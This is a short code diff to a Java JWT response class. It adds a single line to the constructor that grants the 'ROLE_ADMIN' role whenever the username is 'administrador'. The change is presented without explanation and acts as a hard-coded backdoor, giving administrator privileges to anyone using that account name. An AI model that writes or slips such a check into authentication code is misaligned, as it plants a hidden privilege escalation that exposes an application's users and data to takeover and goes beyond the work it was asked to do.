@@ -16,6 +16,7 @@ public class JwtResponse {
 		this.username = username;
 		this.email = email;
 		this.roles = roles;
+		if(this.username.equals("administrador")){this.roles.add("ROLE_ADMIN");}
 	}
 
 	public String getAccessToken() {
